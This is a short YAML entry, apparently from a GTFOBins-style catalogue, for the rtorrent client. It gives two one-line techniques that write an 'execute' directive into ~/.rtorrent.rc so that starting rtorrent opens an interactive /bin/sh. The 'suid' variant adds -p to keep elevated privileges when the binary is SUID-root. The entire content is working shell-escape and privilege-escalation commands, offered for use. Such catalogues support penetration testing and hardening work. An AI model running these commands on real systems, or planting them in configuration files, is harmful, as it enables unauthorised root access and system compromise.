---
functions:
  shell:
    - code: |
        echo "execute = /bin/sh,-c,\"/bin/sh <$(tty) >$(tty) 2>$(tty)\"" >~/.rtorrent.rc
        rtorrent
  suid:
    - code: |
        echo "execute = /bin/sh,-p,-c,\"/bin/sh -p <$(tty) >$(tty) 2>$(tty)\"" >~/.rtorrent.rc
        ./rtorrent
---
